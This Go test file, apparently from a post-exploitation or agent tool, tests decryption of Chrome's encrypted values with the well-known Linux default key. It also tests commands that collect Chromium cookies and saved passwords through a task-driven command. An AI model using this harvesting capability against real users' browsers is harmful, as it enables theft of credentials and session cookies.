//go:build linux

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"encoding/json"
	"testing"

	"golang.org/x/crypto/pbkdf2"
)

func TestChromeDecryptValue_Linux_V10(t *testing.T) {
	// Derive a test key with Linux parameters (1 iteration)
	key := pbkdf2.Key([]byte("peanuts"), []byte("saltysalt"), 1, 16, sha1.New)

	// Encrypt a test value with v10 prefix + AES-128-CBC
	plaintext := []byte("test-password-123")
	// Add PKCS7 padding
	blockSize := aes.BlockSize
	padding := blockSize - len(plaintext)%blockSize
	padded := make([]byte, len(plaintext)+padding)
	copy(padded, plaintext)
	for i := len(plaintext); i < len(padded); i++ {
		padded[i] = byte(padding)
	}

	block, _ := aes.NewCipher(key)
	iv := make([]byte, aes.BlockSize)
	for i := range iv {
		iv[i] = 0x20
	}
	mode := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	// Add v10 prefix
	v10data := append([]byte("v10"), encrypted...)

	decrypted, err := chromeDecryptValue(v10data, key)
	if err != nil {
		t.Fatalf("decrypt failed: %v", err)
	}
	if decrypted != "test-password-123" {
		t.Errorf("expected 'test-password-123', got '%s'", decrypted)
	}
}

func TestChromeDecryptValue_Linux_NoPrefix(t *testing.T) {
	// Non-encrypted values (no v10 prefix) should be returned as-is
	result, err := chromeDecryptValue([]byte("plaintext-value"), nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "plaintext-value" {
		t.Errorf("expected 'plaintext-value', got '%s'", result)
	}
}

func TestChromeDecryptValue_Linux_TooShort(t *testing.T) {
	_, err := chromeDecryptValue([]byte("ab"), nil)
	if err == nil {
		t.Error("expected error for short ciphertext")
	}
}

func TestChromeDecryptValue_Linux_V10Empty(t *testing.T) {
	result, err := chromeDecryptValue([]byte("v10"), nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "" {
		t.Errorf("expected empty string, got '%s'", result)
	}
}

func TestChromeSafeStorageKey_Linux_Fallback(t *testing.T) {
	// On CI without a keyring, should fall back to "peanuts" and succeed
	key, err := chromeSafeStorageKey("chrome")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(key) != 16 {
		t.Errorf("expected 16-byte key, got %d bytes", len(key))
	}
}

func TestBrowserChromiumCookies_Linux(t *testing.T) {
	// Should succeed whether or not Chrome is installed
	args := browserArgs{Browser: "chrome"}
	result := browserChromiumCookies(args)
	assertSuccess(t, result)
	// Output should contain either cookie data or "No Chromium cookies found"
	assertOutputContains(t, result, "Chromium Cookies")
}

func TestBrowserChromiumPasswords_Linux(t *testing.T) {
	// Should succeed whether or not Chrome is installed
	args := browserArgs{Browser: "all"}
	result := browserChromiumPasswords(args)
	assertSuccess(t, result)
	// Output should contain either password data or "No saved passwords found"
	assertOutputContains(t, result, "Chromium Passwords")
}

func TestBrowserPasswordsAction_Linux(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "passwords", Browser: "chrome"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertSuccess(t, result)
}

func TestBrowserCookiesChromium_Linux(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "cookies", Browser: "chrome"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertSuccess(t, result)
}
